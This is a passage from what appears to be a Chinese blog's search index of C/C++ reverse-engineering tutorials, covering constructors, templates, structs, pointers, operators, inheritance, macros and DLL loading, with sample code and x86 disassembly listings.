int a; int b; int c; int d; Student(int a,int b) //有参构造 { this-&gt;a = a; this-&gt;b = b; printf(&quot;有参构造\\r\\n&quot;); } Student() //无参构造 { printf(&quot;无参构造\\r\\n&quot;); } ~Student() //析构函数 { printf(&quot;析构函数\\r\\n&quot;); }}; int main(){ Student s(1,2); Student s1; return 0;} 使用反汇编查看： 12345678910111213141516171819202123: ~Student()24: {0040D790 push ebp0040D791 mov ebp,esp0040D793 sub esp,44h0040D796 push ebx0040D797 push esi0040D798 push edi0040D799 push ecx0040D79A lea edi,[ebp-44h]0040D79D mov ecx,11h0040D7A2 mov eax,0CCCCCCCCh0040D7A7 rep stos dword ptr [edi]0040D7A9 pop ecx //this指针出栈0040D7AA mov dword ptr [ebp-4],ecx25: printf(&quot;析构函数\\r\\n&quot;);0040D7AD push offset string &quot;\\xce\\xf6\\xb9\\xb9\\xba\\xaf\\xca\\xfd\\r\\n&quot; (00422fac)0040D7B2 call printf (004010f0)0040D7B7 add esp,426: }","link":"/2020/05/07/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/"},{"title":"C反汇编 - 模板","text":"模板（Template）指C++程序设计设计语言中采用类型作为参数的程序设计，支持通用程序设计 模板模板函数定义123456789101112131415161718192021222324252627282930313233343536373839404142// Template_Temp.cpp : Defines the entry point for the console application.//#include &quot;stdafx.h&quot;#include &lt;iostream&gt;using namespace std;template &lt;class T&gt;void Bubble(T* array,int size) //冒泡排序{ T temp; for(int i=0;i&lt;size;i++) { for(int j=0;j&lt;size-i;j++) { if(*(array+j)&gt;*(array+j+1))//交换 { temp=*(array+j); *(array+j)=*(array+j+1); *(array+j+1)=temp; } } } for(int k=0;k&lt;10;k++) //将打印也放入了函数 { cout&lt;&lt;&quot; &quot;&lt;&lt;array[k] &lt;&lt; endl; } }int main(int argc, char* argv[]){ int a[10]={1,-2,3,-5,6,7,8,9,0,100}; double array[10] = {1.1,2.2,3.3,6.5,7.8,11,9,-8.3,-9.5}; Bubble(array,10); Bubble(a,10); return 0;} 反汇编查看12345678910111237: Bubble(array,10);004018AA push 0Ah004018AC lea ecx,[ebp-78h]004018AF push ecx004018B0 call @ILT+255(Bubble) (00401104)004018B5 add esp,838: Bubble(a,10);004018B8 push 0Ah004018BA lea edx,[ebp-28h]004018BD push edx004018BE call @ILT+280(Bubble) (0040111d) 类模板定义12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;using namespace std;template&lt;class T,class M&gt;class Base{public: T x; T y; M a; M b; T max() { if(x&gt;y) { cout &lt;&lt; &quot;x&gt;y&quot; &lt;&lt; endl; return 0; } else { cout &lt;&lt; &quot;x&lt;y&quot; &lt;&lt; endl; return 0; } } M Min() { if(a&gt;b) { cout &lt;&lt; &quot;a&gt;b&quot; &lt;&lt; endl; return a; } else { cout &lt;&lt; &quot;a&lt;b&quot; &lt;&lt; endl; return b; } }protected:private:};int main(){ Base &lt;int,char&gt;base; base.a = 1; base.b = 2; base.max(); base.x = 'a'; base.y = 'b'; base.Min(); return 0;} 反汇编查看12345678910111213141547: Base &lt;int,char&gt;base;48: base.a = 1;00401188 mov byte ptr [ebp-4],149: base.b = 2;0040118C mov byte ptr [ebp-3],250: base.max();00401190 lea ecx,[ebp-0Ch]00401193 call @ILT+165(Base&lt;int,char&gt;::max) (004010aa)51: base.x = 'a';00401198 mov dword ptr [ebp-0Ch],61h52: base.y = 'b';0040119F mov dword ptr [ebp-8],62h53: base.Min();004011A6 lea ecx,[ebp-0Ch]004011A9 call @ILT+0(Base&lt;int,char&gt;::Min) (00401005) 我们可以看到，模板为我们生成了两个不同的call的地址，我们跟随看一下； 第一个： 1234567891011121314151617181920@ILT+165(?max@?$Base@HD@@QAEHXZ):004010AA jmp Base&lt;int,char&gt;::max (004011e0)15: if(x&gt;y)004011FD mov eax,dword ptr [ebp-4]00401200 mov ecx,dword ptr [ebp-4]00401203 mov edx,dword ptr [eax]00401205 cmp edx,dword ptr [ecx+4]00401208 jle Base&lt;int,char&gt;::max+4Ch (0040122c)16: {17: cout &lt;&lt; &quot;x&gt;y&quot; &lt;&lt; endl;0040120A push offset @ILT+40(std::endl) (0040102d)0040120F push offset string &quot;x&gt;y&quot; (00432020)00401214 push offset std::cout (00439528)00401219 call @ILT+160(std::operator&lt;&lt;) (004010a5)0040121E add esp,800401221 mov ecx,eax00401223 call @ILT+115(std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt;) (00401078) 第二个： 1234567891011121314151617181920@ILT+0(?Min@?$Base@HD@@QAEDXZ):00401005 jmp Base&lt;int,char&gt;::Min (00401280)29: if(a&gt;b)0040129D mov eax,dword ptr [ebp-4]004012A0 movsx ecx,byte ptr [eax+8]004012A4 mov edx,dword ptr [ebp-4]004012A7 movsx eax,byte ptr [edx+9]004012AB cmp ecx,eax004012AD jle Base&lt;int,char&gt;::Min+55h (004012d5)30: {31: cout &lt;&lt; &quot;a&gt;b&quot; &lt;&lt; endl;004012AF push offset @ILT+40(std::endl) (0040102d)004012B4 push offset string &quot;a&gt;b&quot; (00432028)004012B9 push offset std::cout (00439528)004012BE call @ILT+160(std::operator&lt;&lt;) (004010a5)004012C3 add esp,8004012C6 mov ecx,eax004012C8 call @ILT+115(std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt;) (00401078)","link":"/2020/05/12/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E6%A8%A1%E6%9D%BF/"},{"title":"C反汇编 - 浮点","text":"float类型就是一种小数类型； 浮点类型浮点种类float4字节 1float x = 1.23; double8字节 1double d = 2.34; long double8字节，某些平台下会是16字节 1long double d = 2.34; 浮点类型存储格式float和double在存储方式上都是遵从IEEE编码 float转换步骤","link":"/2020/04/29/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E6%B5%AE%E7%82%B9/"},{"title":"C反汇编 - 结构体","text":"由一系列具有相同类型或不同类型的数据构成的数据集合，叫做结构体(struct) 结构体结构体定义12345678struct st //struct是一个关键字 st是用户自己定义的一个名字{ int a; char c; short s; char *name; char Name[1024];} 使用12345678void Function(person p) { st s; s.a = 10; s.c = 20; s.s = 30;} 说明：结构体在定义的时候，除了自身以外，可以使用任何类型。 123456789101112131415161718192021222324252627struct st1 { int a; int b;}; struct st2 { char a; short b; int arr[10]; st1 s;}; void Funtion() { st2 s2; s2.a = 'A'; s2.b = 12; s2.arr[0] = 1; s2.arr[1] = 2; s2.arr[3] = 3; s2.s.a = 100; s2.s.b = 200; printf(&quot;%d\\n&quot;,s2.s.a);} Siezof基本类型12345678910111213printf(&quot;%d\\n&quot;,sizeof(char)); printf(&quot;%d\\n&quot;,sizeof(short int)); printf(&quot;%d\\n&quot;,sizeof(int)); printf(&quot;%d\\n&quot;,sizeof(long int)); printf(&quot;%d\\n&quot;,sizeof(__int64)); printf(&quot;%d\\n&quot;,sizeof(float)); printf(&quot;%d\\n&quot;,sizeof(double)); int x = 10; printf(&quot;%d\\n&quot;,sizeof(x)); 数组类型1234567891011121314 char arr1[10] = {0}; short arr2[10] = {0}; int arr3[10] = {0}; printf(&quot;%d\\n&quot;,sizeof(arr1)); printf(&quot;%d\\n&quot;,sizeof(arr2)); printf(&quot;%d\\n&quot;,sizeof(arr3)); printf(&quot;%d\\n&quot;,sizeof(arr1[10])); printf(&quot;%d\\n&quot;,sizeof(arr2[10])); printf(&quot;%d\\n&quot;,sizeof(arr3[10])); 结构体类型123456789101112131415161718192021222324252627 struct S1 { char a; int b; char c;}; struct S2 { int a; char b; char c;}; int main(int argc, char* argv[]) { S1 s1; S2 s2; printf(&quot;%d\\n&quot;,sizeof(s1)); printf(&quot;%d\\n&quot;,sizeof(s2)); printf(&quot;%d\\n&quot;,sizeof(S1)); printf(&quot;%d\\n&quot;,sizeof(S2)); return 0;} 对齐对齐的意义数据对齐的本质：效率还是空间，二选一的结果 对齐方法12#pragma pack( n ) //n为字节对齐数，其取值1、2、4、8，默认8 如果这个值比结构体成员的sizeof值小，那么该成员的偏移量应该以此值为准，即是说，结构体成员的偏移量应该取二者的最小值. 12345678#pragma pack(8) struct Test { int a ; __int64 b ; char c ; }; 对齐原则原则一：数据成员对齐规则：结构的数据成员，第一个数据成员放在offset为0的地方，以后每个数据成员存储的起始位置要从该成员大小的整数倍开始(比如int在32位机为４字节，则要从4的整数倍地址开始存储). 原则二：结构体的总大小，也就是sizeof的结果，必须是其内部最大成员的整数倍，不足的要补齐。 原则三：如果一个结构里有某些结构体成员，则结构体成员要从其内部最大元素大小的整数倍地址开始存储。(struct a里存有struct b，b里有char，int，double等元素，那b应该从8的整数倍开始存储.) 原则四：对齐参数如果比结构体成员的sizeof值小，该成员的偏移量应该以此值为准.也就是说，结构体成员的偏移量应该取二者的最小值. 结构体数组定义12345678910111213141516#include&lt;stdio.h&gt;struct man{ char name[10]; int age;}m[5];int main(){ m[1].age = 10; strcpy(m[1].name,&quot;zhangrui&quot;); //结构体数组不允许直接使用“=” printf(&quot;name = %s, age = %d\\n&quot;,m[1].name,m[1].age); return 0;} 使用typedeftypedef为C语言的关键字，作用是为一种数据类型定义一个新名字。这里的数据类型包括内部数据类型（int,char等）和自定义的数据类型（struct等）。 定义123typedef unsigned char BYTE; typedef unsigned short WORD; typedef unsigned int DWORD; 一维数组12345678910111213141516typedef int vector[10]; int main(int argc, char* argv[]) { vector v; v[0] = 1; v[1] = 2; v[2] = 3; v[3] = 4; v[4] = 5; return 0; } 二维数组1234567891011121314151617181920typedef int name[5][5]; typedef int nameTable[5][5][5]; int main(int argc, char* argv[]) { matrix v; nameTable n; v[0][0] = 1; v[0][1] = 2; v[0][2] = 3; v[0][3] = 4; v[0][4] = 5; n[0][0][0] = 1; return 0; } 结构体1234567typedef struct student { int x; int y; }stu;","link":"/2020/05/03/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E7%BB%93%E6%9E%84%E4%BD%93/"},{"title":"C反汇编 - 结构体指针","text":"结构体指针，可细分为指向结构体变量的指针和指向结构体数组的指针。 结构体指针结构体指针定义“结构体变量名.成员名”的方式引用结构体变量中的成员，除了这种方法之外还可以使用指针 1234567891011121314#include &lt;stdio.h&gt;struct Point{ //定义结构体 int x; int y;};int main(){ Point p; //实例化一个对象 Point* px = &amp;p; //给指针赋值，赋值使用&amp;(取地址) return 0;} 指针自增123456789101112131415161718#include &lt;stdio.h&gt;struct Point{ int x; int y;};int main(){ Point p; Point* px = &amp;p; printf(&quot;%p\\r\\n&quot;,px); px++; printf(&quot;%p\\r\\n&quot;,px); return 0;} 结构体指针做加法，一定要考虑结构体的对齐，做加法的时候，去掉指针的修饰符号，然后结构体多大，就加多少 指针自减*减去一个”“号，然后再减去结构体的大小** 12345678910111213141516171819#include &lt;stdio.h&gt;struct Point{ int x; int y;};int main(){ Point p; Point* px = &amp;p; printf(&quot;%p\\r\\n&quot;,px); //px++; px--; printf(&quot;%p\\r\\n&quot;,px); return 0;} 成员赋值结构体指针赋值通过”-&gt;”，结构体赋值通过”.”出来 123456789101112131415161718#include &lt;stdio.h&gt;struct Point{ int x; int y;};int main(){ Point p = {1,2}; Point* px = &amp;p; px-&gt;x = 100; //这里不可以通过.来找到 px-&gt;y = 200; printf(&quot;%d %d&quot;,px-&gt;x,px-&gt;y); return 0;} 类型强转12345678910111213141516#include &lt;stdio.h&gt;struct Point{ int x; int y;};int main(){ int Array[] = {1,2,3,4,5,6,7,8,9,10}; Point* p = (struct Point*)Array; int x = p-&gt;x; int y = p-&gt;y; return 0;} 让指针做加法 任何指针类型都不需要管是什么类型给他赋值 结构体指针应用应用1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# include &lt;stdio.h&gt;# include &lt;string.h&gt;# include &lt;Windows.h&gt;struct AGE{ int year; int month; int day;};struct STUDENT{ char name[20]; //姓名 int num; //学号 struct AGE birthday; //生日 float score; //分数};int main(){ struct STUDENT student1[5]; struct STUDENT* p = NULL; p = &amp;student1[1]; strcpy((p-&gt;name),&quot;小明&quot;); p-&gt;birthday.year = 2020; (*p).birthday.day = 13; (*p).birthday.month = 4; p-&gt;num = 0316; (*p).score = 58.5; printf(&quot;%s\\r\\n&quot;,p-&gt;name); printf(&quot;%d\\r\\n&quot;,p-&gt;birthday.year); printf(&quot;%d\\r\\n&quot;,(*p).birthday.month); printf(&quot;%d\\r\\n&quot;,(*p).birthday.day); printf(&quot;%d\\r\\n&quot;,(*p).num); printf(&quot;%.1f\\r\\n&quot;,p-&gt;score); p++; strcpy((p-&gt;name),&quot;张瑞&quot;); p-&gt;birthday.year = 2018; (*p).birthday.day = 23; (*p).birthday.month = 4; p-&gt;num = 0315; (*p).score = 69.5; printf(&quot;%s\\r\\n&quot;,p-&gt;name); printf(&quot;%d\\r\\n&quot;,p-&gt;birthday.year); printf(&quot;%d\\r\\n&quot;,(*p).birthday.month); printf(&quot;%d\\r\\n&quot;,(*p).birthday.day); printf(&quot;%d\\r\\n&quot;,(*p).num); printf(&quot;%.1f\\r\\n&quot;,p-&gt;score); //system(&quot;pause&quot;); return 0;} Demo2: 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;struct Student{ char *name; int Num;};int main(){ struct Student st; struct Student* p; p = &amp;st; p-&gt;name = (char*)malloc(sizeof(char) * 24); //给指针申请内存 strcpy(p-&gt;name,&quot;张瑞&quot;); p-&gt;Num = 22; printf(&quot;姓名:%s 年龄:%d&quot;,p-&gt;name,p-&gt;Num); p++; printf(&quot;\\r\\n&quot;); strcpy(p-&gt;name,&quot;王麻子&quot;); p-&gt;Num = 20; printf(&quot;姓名:%s 年龄:%d&quot;,p-&gt;name,p-&gt;Num); return 0;}","link":"/2020/05/05/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E7%BB%93%E6%9E%84%E4%BD%93%E6%8C%87%E9%92%88/"},{"title":"C反汇编 - 表达式","text":"C语言中的表达式一种有值的语法结构，它由运算符将变量、常量、函数调用返回值结合而成 运算符算数运算符算数运算符无非就是常用的”加、减、乘、除、取余、自加减” 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;int Add(int i){ return ++i;}int main(){ int i = 10; int y = 20; printf(&quot;i+y=%d\\t\\n&quot;,i+y); printf(&quot;i-y=%d\\t\\n&quot;,i-y); printf(&quot;i*y=%d\\t\\n&quot;,i*y); printf(&quot;i/y=%d\\t\\n&quot;,i/y); printf(&quot;i%y=%d\\t\\n&quot;,i%y); printf(&quot;i++%d\\r\\n&quot;,i++); printf(&quot;++i%d\\r\\n&quot;,++i); system(&quot;pause&quot;);} 前++和后++ i++; 先运算，再加 ++i; 先加，后运算 Demo： 123456789101112#include &lt;stdio.h&gt;int Add(int x){ return x++;}int main(){ int x = 10; Add(x); return 0;} 运算结果为10 123456789101112#include &lt;stdio.h&gt;int Add(int x){ return ++x;}int main(){ int x = 10; Add(x); return 0;} 运算结果为11 对比一下反汇编代码： 1234567891011124: return ++x;00401038 mov eax,dword ptr [ebp+8] ;[ebp+8]处为传递的参数，100040103B add eax,1 ;直接+1，eax为110040103E mov dword ptr [ebp+8],eax ;将eax放到ebp+8处00401041 mov eax,dword ptr [ebp+8] ;ebp+8处的b传送给eax返回4: return x++;00401038 mov eax,dword ptr [ebp+8] ;[ebp+8]处为传递的参数，100040103B mov ecx,dword ptr [ebp+8] ;将[ebp+8]处的参数传递给了ecx0040103E add ecx,1 ;ecx加100401041 mov dword ptr [ebp+8],ecx ;ecx的值传递给[ebp+8]处 ;eax的值没有改变，函数的返回值通过eax返回 关系运算符关系运算符包括：”&lt;”、 “&lt;=”、 “&gt;”、 “&gt;=”、 “==”、 “!=” 关系运算符的值只能是0或1 逻辑运算符 逻辑运算符包括：”!”、”&amp;&amp;”、”||” 1234567int main(){ int x = 10; int y = 20; int z = 30; int r = x&gt;y &amp; x&lt;z;} 或、且、非 位运算符 运算符 意义 示例 对于每个位位置的结果（1=设定，0=清除） &amp; 位 AND x&amp;y 如果 x 和 y 都为 1，则得到 1；如果 x 或 y 任何一个为 0，或都为0，则得到 0 | 位 OR x|y 如果 x 或 y 为 1，或都为 1，则得到 1；如果 x 和 y 都为 0，则得到 0 ^ 位 XOR x^y 如果 x 或 y 的值不同，则得到 1；如果两个值相同，则得到 0 ~ 位 NOT（I的补码） ~x 如果 x 为 0，则得到 1，如果 x 是 1，则得到 0 123456789101112131415161718#include &lt;stdio.h&gt;int main(){ int x = 1; int y = 2; unsigned z = 2; printf(&quot;与运算:%d\\r\\n&quot;,x&amp;y); printf(&quot;或运算:%d\\r\\n&quot;,x|y); printf(&quot;异或运算:%d\\r\\n&quot;,x^y); printf(&quot;非运算:%d\\r\\n&quot;,~y); printf(&quot;有符号左移:%d\\r\\n&quot;,y&lt;&lt;1); printf(&quot;无符号左移:%d\\r\\n&quot;,z&lt;&lt;1); printf(&quot;有符号右移:%d\\r\\n&quot;,y&gt;&gt;1); printf(&quot;无符号右移:%d\\r\\n&quot;,z&gt;&gt;1); system(&quot;pause&quot;);} shl指令和shr指令和sar指令的区别： shl是逻辑左移 shr是逻辑右移 sar是算术右移 赋值运算符条件运算符1234567#include &lt;stdio.h&gt;int main(){ int x = 10; int y = 20; int z = x&gt;y?2:3;}","link":"/2020/04/29/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"title":"C反汇编 - 继承","text":"继承就是数据的复制； 权限搬大佬的一张的图： 定义类眼中的自己类中定义的所有成员，不论是以public, protected还是private修饰，对类自身而言，它们都是可见的。 对象眼中的类站在类的对象的角度去观察类，这时，只有类中的public成员是可见的。而其中的protected和private成员对对象而言，是不可见的。 友元眼中的类站在友元的角度，类中所有的成员，不论是以public, protected还是private修饰，对友元而言，它们都是可见的。 派生类眼中的基类派生类只能看见基类中的public和protected成员。而基类中的private成员，对于派生类而言，是不可见的。有一点必须注意，这里的public, protected和private均是指基类在被继承之后所呈现出来的成员访问权限。下表展示了不同的继承方式，对基类中各成员访问权限的影响。 权限public公有成员可被与该类对象处在同一作用域内的任何函数访问。 protected保护成员只能被类中成员或其派生类的成员函数或该类的友元函数访问。 private私有成员只能被类中的成员函数及该类的友元函数访问。 术语 对象：与类相对，对象是类的实例 派生类：与基类相对，派生类就是子类。 继承：继承与派生是一个意思。继承偏重指出此过程中不变的部分，而派生是偏重在原有基础上新增的部分 成员：类中成员变量和成员的统称。 使用对象的访问权限123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;using namespace std;class School //学校类{public: int Id; //学号protected: int Report; //成绩private: int Birth; //出生public: School(int ID,int REPORT,int BIRTH) { this-&gt;Id = ID; //使用this指针赋值 this-&gt;Birth = BIRTH; this-&gt;Report = REPORT; } ~School() { ; } int CityA() { return Id; } int CityB() { return Birth; } int CityC() { return Report; } };int main(){ int temp1,temp2,temp3; School sl(10,20,30); sl.Id = 100; //sl.Report = 200; //对象不可以访问protected类 //l.Birth = 300; //对象不可以访问Private类 //printf(&quot;%d\\r\\n&quot;,sl.Id); temp1 = sl.CityA(); temp2 = sl.CityB(); temp3 = sl.CityC(); printf(&quot;%d\\r\\n&quot;,temp1); printf(&quot;%d\\r\\n&quot;,temp2); printf(&quot;%d\\r\\n&quot;,temp3); return 0;} 类可以访问自身的所有成员，但对象不行 对象只可以访问类的public成员 友元的访问权限友元的访问权限友元函数12345678910111213141516171819202122232425#include &quot;iostream&quot;using namespace std;class Point{public: friend void fun(Point t);//友元函数private: int a;protected: int b;};void fun(Point t) //通过友元函数修改值{ t.a = 100; t.b = 2000; cout &lt;&lt; t.a &lt;&lt; &quot; &quot; &lt;&lt; t.b &lt;&lt; endl;}int main(){ Point test; fun(test); system(&quot;pause&quot;); return 0;} 友元类1234567891011121314151617181920212223242526272829303132333435363738#include &quot;iostream&quot;using namespace std;class Point{ friend class Line; //友元类public: void fun() { this-&gt;x = 100; this-&gt;y = 200; }protected: int x ;private: int y ;};class Line{public: void Print() { t.fun(); t.y = 1000; t.x = 2000; cout &lt;&lt; t.x &lt;&lt; &quot; &quot; &lt;&lt; t.y &lt;&lt; endl; }protected:private: Point t;};int main(){ Line l; l.Print(); return 0;} 友元成员函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;using namespace std;class Line;class Point{public: void fun(Line l);};class Line{public: friend void Point::fun(Line l); Line() { ; } void print() { cout &lt;&lt; this-&gt;x &lt;&lt; endl; cout &lt;&lt; this-&gt;y &lt;&lt; endl; } ~Line() { ; }private: int x;protected: int y;};void Point::fun(Line l){ l.x = 1000; l.y = 2000; l.print();}int main(){ Line le; Point t; t.fun(le); return 0;} 继承定义定义一个基类123456789101112131415161718#include &lt;iostream&gt;using namespace std;class {public: void display() { cout &lt;&lt; &quot;display&quot; &lt;&lt; endl; }protected: int x;private: int y;}; 公有继承公有继承：派生类的对象可以访问基类中的公有成员，派生类的成员函数可以访问基类的共有和保护成员，基类的共有成员和保护成员作为派生类的成员时，保持其原有状态； 12345678910111213141516class A : public Base{public: void print() { cout &lt;&lt; &quot;sYstemk1t&quot; &lt;&lt; endl; display(); //派生类内部可以访问基类的公有成员 x = 0; //派生类内部可以访问基类的保护成员 //y = 1; //这个语句不成功，因为公有继承无法访问私有函数 cout &lt;&lt; &quot;x = &quot; &lt;&lt; x &lt;&lt;endl; }protected: int Ax;private: int Bx;}; 保护继承1234567891011121314151617class B : protected Base{public: void print() { cout &lt;&lt; &quot;Hello&quot; &lt;&lt; endl; display(); x = 1; cout &lt;&lt; &quot;x = &quot; &lt;&lt; x &lt;&lt; endl; //y = 10; //派生类内部不可以访问基类的私有成员 }protected: int Bx1;private: int Bx2;}; 私有继承12345678910111213141516class C : private Base{public: void print() { cout &lt;&lt; &quot;Hello&quot; &lt;&lt; endl; display(); //派生类内部可以访问基类的公有成员 x = 1; //派生类内部可以访问基类的保护成员 cout &lt;&lt; &quot;x = &quot; &lt;&lt; x &lt;&lt; endl; //y = 10; //派生类内部不可以访问基类的私有成员 }protected: int Cx1;private: int Cx2;}; 完整代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#include &lt;iostream&gt;using namespace std;class Base{public: void display() { cout &lt;&lt; &quot;display&quot; &lt;&lt; endl; }protected: int x;private: int y;};class A : public Base{public: void print() { cout &lt;&lt; &quot;sYstemk1t&quot; &lt;&lt; endl; display(); x = 0; //y = 1; //这个语句不成功，因为公有继承无法访问私有函数 cout &lt;&lt; &quot;x = &quot; &lt;&lt; x &lt;&lt;endl; }protected: int Ax;private: int Bx;};class B : protected Base{public: void print() { cout &lt;&lt; &quot;Hello&quot; &lt;&lt; endl; display(); x = 1; cout &lt;&lt; &quot;x = &quot; &lt;&lt; x &lt;&lt; endl; //y = 10; //派生类内部不可以访问基类的私有成员 }protected: int Bx1;private: int Bx2;};class C : private Base{public: void print() { cout &lt;&lt; &quot;Hello&quot; &lt;&lt; endl; display(); //派生类内部可以访问基类的公有成员 x = 1; //派生类内部可以访问基类的保护成员 cout &lt;&lt; &quot;x = &quot; &lt;&lt; x &lt;&lt; endl; //y = 10; //派生类内部不可以访问基类的私有成员 }protected: int Cx1;private: int Cx2;};int main(){ //公有继承部分： cout &lt;&lt; &quot;换行为公有继承&quot; &lt;&lt; endl; A aa; aa.display(); aa.print(); //aa.x = 1; //派生类外部不可以访问基类的保护成员 //aa.y = 3; //派生类外部不可以访问基类的私有成员 cout &lt;&lt; &quot;换行为保护继承&quot; &lt;&lt; endl; //保护继承 B bb; //bb.display(); //派生类外部不可以访问基类的公有成员 bb.print(); //bb.x = 10; //派生类外部不可以访问基类的保护成员 //bb.y = 20; //派生类外部不可以访问基本的私有成员 cout &lt;&lt; &quot;换行为保护继承&quot; &lt;&lt; endl; C cc; //cc.display(); ////派生类外部不可以访问基类的公有成员 cc.print(); //cc.x = 10; //派生类外部不可以访问基类的保护成员 //cc.y = 20; //派生类外部不可以访问基本的私有成员 return 0;} 使用继承使用私有类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;iostream&gt;using namespace std;class A{private: int a;protected: int b;public: int c; void show() { cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; &quot;c = &quot; &lt;&lt; c &lt;&lt;endl; } void set_a(int a) //给私有函数做了一个接口 { this-&gt;a = a; }};class B:protected A{public: void set_a(int a) //继承上面的接口 { A::set_a(a); } void set_b(int b) //重新做了一个接口指向保护成员 { this-&gt;b = b; }};class C:protected B{public: void set(int a,int b,int c) { set_a(a); set_b(b); this-&gt;c = c; } void show() { A::show(); }};int main(){ C c; c.set(10,20,30); c.show(); return 0;}","link":"/2020/05/07/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E7%BB%A7%E6%89%BF/"},{"title":"C反汇编 - 预处理","text":"程序设计领域中，预处理一般是指在程序源代码被翻译为目标代码的过程中，生成二进制代码之前的过程。 预处理宏定义无参宏定义123简单宏：#define 标识符 字符序列# define FALSE 0# define NAME &quot;sYstemk1t&quot; Demo: 12345678#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;int main(){ printf(&quot;%d\\r\\n&quot;,MAX_PATH); return 0;} 有参宏定义12#define MAX(A,B)((A)&gt;(B)?(A):(B)) Demo： 123456789101112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;#define MAX(A,B)((A)&gt;(B)?(A):(B))int main(){ int x = 10; int y = 20; int z = MAX(x,y); printf(&quot;max:%d&quot;,z); return 0;} 条件编译定义undef取消已经定义的宏定义 endifif必须配合endif使用 ifdef如果宏已经定义了，则编译下面的代码 ifndef如果宏没有定义，则编译下面的代码 include包含文件 文件包含前置声明在头文件中不要包含其他的头文件","link":"/2020/05/06/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E9%A2%84%E5%A4%84%E7%90%86/"},{"title":"C逆向分析解密 - 启动函数","text":"","link":"/2020/04/24/C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E8%A7%A3%E5%AF%86-%E5%90%AF%E5%8A%A8%E5%87%BD%E6%95%B0/"},{"title":"DLL高级技术","text":"我们还可以使用DLL来进行更多的工作，熟练大多数应用不一定需要这些方法 DLL高级技术DLL模块的显式加载和符号链接如果线程需要调用DLL模板中的函数，那么DLL的文件映像必须映射到调用线程的进程地址空间中。 创造DLL ： 建立带有输出原型/结构/符号的头文件。 建立实现输出函数/变量的 C/C++源文件。 编译器为每个 C/C++源文件生成 .obj模块。 链接程序将生成DLL的 .obj模块链接起来。 如果至少输出一个函数/变量，那么链接程序也生成 .lib 文件。创造EXE ： 建立带有输入原型/结构/符号的头文件(视情况而定)。 建立不引用输入函数/变量的 C/C++源文件。 编译器为每个 C/C++源文件生成 .obj源文件。 链接程序将各个 .obj模块链接起来，生成 .exe文件。注: DLL的lib文件是不需要的，因为并不直接引用输出符号。.exe 文件不包含输入表。运行应用程序 ： 加载程序为 .exe 创建模块地址空进程的主线程开始执行；应用程序启动运行。显式加载DLL： 一个线程调用LoadLibrary (Ex)函数，将DLL加载到进程的地址空间 这时线程可以调用GetProcAddress 以便间接引用DLL的输出符号。 有两种方法可以实现DLL的显式加载： 让应用程序的源代码只引用DLL中包含的符号，这样应用程序启动时，加载程序就能够隐含加载（和链接）需要的DLL 在应用程序运行时让因公程序显式加载需要的DLL并且显式链接到需要的输出符号。换句话，当应用程序运行时，它里面的线程能够决定它是否需要调用DLL中的函数 显式加载DLL模块无论任何时候，进程中的线程可以将一个DLL映射到进程的地址空间，方法是调用一下函数： 1234567HINSTANCE LoadLibrary(PCTSTR pszDLLPathName);HINSTANCE LoadLibraryEx( PCTSTR pszDLLPathName, HANDLE hFile, //辅助参数，必须是NULL DWORD dwFlags //辅助参数，必须是0，或者为以下介绍的三个参数 ); 这两个函数均用于找到系统上的文件景象，并设法将DLL的文件映像映射到调用进程的地址空间中。两个函数返回值HINSTANCE值用于标识文件映像映射到虚拟内存地址。 如果DLL不能被映射到进程的地址空间，则返回NULL 1.DONT_RESOLVE_DLL_REFERENCES 建议永远不要使有这个值，它的存在仅仅是为了向后兼容、 DONT_RESOLVE_DLL_REFERENCES标志用于告诉系统将DLL映射到调用进程的地址空间中。该函数不必调用DLLMain函数就能映射文件映像。 DLL能够输入另一个DLL中包含的函数，当系统将一个DLL映射到进程的地址空间中，它也要查看该DLL是否需要的DLL，并且自动加载DLL，当系统设置了该函数的时候，系统并不自动将其他的DLL加载到进程的地址空间中。 2.LOAD_LIBRARY_AS_DATAFILE DONT_RESOLVE_DLL_REFERENCES和LOAD_LIBRARY_AS_DATAFILE标志类似，因为系统只是将DLL映射到进程的地址空间中，它像数据文件一样，系统不需要额外的时候来执行代码。如果设置了该函数，系统将以它要执行文件中的代码时的同样方式来设定页面保护属性。 由于EXE文件没有DLLmain函数，因此，当调用LoadLibraryEx来加载一个exe的时候，必须设定LOAD_LIBRARY_AS_DATAFILE标志。 3.LOAD_WITH_ALTERED_SEARCH_PATH 该标志用于改变LoadLibraryEx用来查找特定DLL文件时的搜索算法。通常情况下，LoadLibraryEx下面的方法来进行文件搜索： 包含可执行映像文件的目录。 进程的当前目录。 Wi n d o w s系统目录。 Wi n d o w s目录。 PAT H环境变量中列出的各个目录。 如果设定了LOAD_WITH_ALTERED_SEARCH_PATH，那么搜索算法就用按照一下的顺序来搜索： pszDLLPathName参数中设定的目录。 进程的当前目录。 Wi n d o w s的系统目录。 Wi n d o w s目录。 PAT H环境变量中列出的目录。 4.LOAD_LIBRARY_AS_IMAGE_RESOURCE 